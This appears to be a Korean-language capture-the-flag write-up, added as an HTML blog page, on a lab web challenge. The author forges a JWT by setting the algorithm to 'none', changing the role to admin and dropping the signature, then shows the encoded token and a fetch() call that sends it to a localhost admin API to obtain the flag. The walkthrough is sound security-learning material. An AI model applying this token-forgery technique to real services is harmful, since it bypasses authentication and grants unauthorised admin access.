@@ -1,0 +1,40 @@
+<!doctype html><html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="Raw_Egg의 개발·보안 학습 기록"><meta name="theme-color" content="#fff9ed"><title>Web - None algorithm · Raw_Egg</title><link rel="stylesheet" href="../../style.css"><link rel="stylesheet" href="../../egg-extra.css"><script src="../../app.js" defer></script></head><body><a class="skip" href="#main">본문으로 건너뛰기</a><aside class="rail"><a class="logo" href="../../" aria-label="Raw_Egg 홈"><span class="logo-shape"><i></i></span><span>Raw_Egg<span class="period">.</span></span></a><nav class="rail-nav" aria-label="주 메뉴"><a  href="../../">Home</a><a aria-current="page" href="../../archive/">Records</a><a  href="../../categories/">Categories</a><a  href="../../about/">About</a></nav><div class="rail-bottom"><span>make me baked<span class="period">.</span></span><button class="theme" type="button" aria-label="색상 모드 전환">◐ <span>Dark</span></button></div></aside><header class="mobile-head"><a href="../../">🥚 Raw_Egg.</a><button class="menu" type="button" aria-expanded="false" aria-label="메뉴 열기">☰</button></header><main id="main" class="main"><article class="article"><a class="back" href="../../archive/">← 기록으로</a><header class="article-head"><span class="kicker">2026-10-10 · RECORD</span><h1>Web - None algorithm</h1><p>문제설명: 아이디만 입력하면 로그인되는 모임 회원포탈이다. 발급된 토큰으로 정보를 조회하거나, 관리자라면 관리자 전용 대시보드에 접근할 수 있다. 목표: 서명이 없는 토큰으로 관리자 api를 통과하…</p></header><div class="article-body"><h3>문제설명:</h3>
+<p>아이디만 입력하면 로그인되는 모임 회원포탈이다. 발급된 토큰으로 정보를 조회하거나, 관리자라면 관리자 전용 대시보드에 접근할 수 있다. <br><br></p>
+<h3>목표:</h3>
+<p>서명이 없는 토큰으로 관리자 api를 통과하라</p>
+<p>&nbsp;</p>
+<h3>Write up:</h3>
+<p>페이지에&nbsp;들어가면&nbsp;신고서를&nbsp;작성할&nbsp;수&nbsp;있는&nbsp;란이&nbsp;있다. <br>탐방객&nbsp;이름을&nbsp;받아서&nbsp;신고접수를&nbsp;하면&nbsp;토큰을&nbsp;발급한다. <br>내&nbsp;신고내용을&nbsp;누르면&nbsp;role과&nbsp;username을&nbsp;확인할&nbsp;수&nbsp;있다. <br>관리사무소&nbsp;자료는&nbsp;error:&nbsp;"관리자만&nbsp;접근할&nbsp;수&nbsp;있습니다."라는&nbsp;문구가&nbsp;뜬다. <br><br>/api/profile에서&nbsp;내&nbsp;신고내용을,&nbsp;/api/admin/dashboard에서&nbsp;관리사무소&nbsp;전용&nbsp;자료를&nbsp;확인할&nbsp;수&nbsp;있다라고&nbsp;적혀져있었고, <br>GET&nbsp;&nbsp;/api/admin/dashboard&nbsp;&nbsp;&nbsp;&nbsp;헤더&nbsp;Authorization:&nbsp;Bearer&nbsp;&lt;token&gt;라는&nbsp;값이&nbsp;블러처리&nbsp;되어있었다. <br>관리자용&nbsp;토큰을&nbsp;발급받은뒤&nbsp;dashboard에&nbsp;get으로&nbsp;헤더에&nbsp;token값을&nbsp;넣어서&nbsp;호출&nbsp;하라는것&nbsp;같다. <br><br>1.&nbsp;session&nbsp;값&nbsp;수정 <br>role을&nbsp;admin&nbsp;으로&nbsp;수정하고&nbsp;/api/admin/dashboard에&nbsp;접근했지만&nbsp;토큰값자체가&nbsp;수정된것은&nbsp;아니기에&nbsp;실패했다. <br><br>1번이&nbsp;실패&nbsp;한뒤,&nbsp;토큰값을&nbsp;base64에&nbsp;디코딩해보았다. <br>데이터의&nbsp;페이로드에는&nbsp;다음과&nbsp;같은&nbsp;값이&nbsp;들어있었다.</p>
+<pre><code>{
+  "username": "hiker01",
+  "role": "member"
+}</code></pre>
+<p><br><br>데이터의 헤더에는</p>
+<pre><code> {"alg": "HS256", "typ": "JWT"}</code></pre>
+<p>값이 들어있었다. <br><br>그래서&nbsp;토큰값을&nbsp;임의로&nbsp;작성해&nbsp;인코딩하기로&nbsp;했다. <br><br>우선&nbsp;alg를none으로&nbsp;바꾸어&nbsp;보았다. <br>페이로드는&nbsp;role만&nbsp;바꾸어주었고&nbsp;서명은&nbsp;비워두었다. <br><br>그렇게&nbsp;인코딩해&nbsp;토큰값을&nbsp;만들어준뒤 <br>fetch&nbsp;함수를&nbsp;사용해&nbsp;/api/admin/dashboard에&nbsp;보내주는&nbsp;함수를&nbsp;작성했다. <br><br></p>
+<pre><code>{
+    const myToken = "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6ICJoaWtlcjAxIiwgInJvbGUiOiAiYWRtaW4ifQ.";
+    const myUrl = "http://127.0.0.1:8151/api/admin/dashboard"; 
+
+    fetch(myUrl, {
+        method: "GET",
+        headers: {
+            "Authorization": `Bearer ${myToken}`,
+            "Content-Type": "application/json"
+        }
+    })
+    .then(response =&gt; {
+        console.log("Status Code:", response.status); 
+        return response.text(); 
+    })
+    .then(data =&gt; {
+        console.log("Response Data:", data); 
+    })
+    .catch(error =&gt; {
+        console.error("Error:", error);
+    });
+}</code></pre>
+<p>&nbsp;</p>
+<p>바로 플래그가 떴다.</p>
+<p>&nbsp;</p>
+<p>토큰값을 인코딩해볼 생각을 처음 해본것 같다.</p></div><p class="source-note">원문: <a href="https://ms-egg.tistory.com/11" target="_blank" rel="noopener noreferrer">Tistory ↗</a></p><a class="back" href="../../archive/">← 기록으로</a></article><footer><span>© 2026 Raw_Egg</span><a href="https://github.com/BackedEgg" target="_blank" rel="noopener noreferrer">GitHub ↗</a></footer></main></body></html>
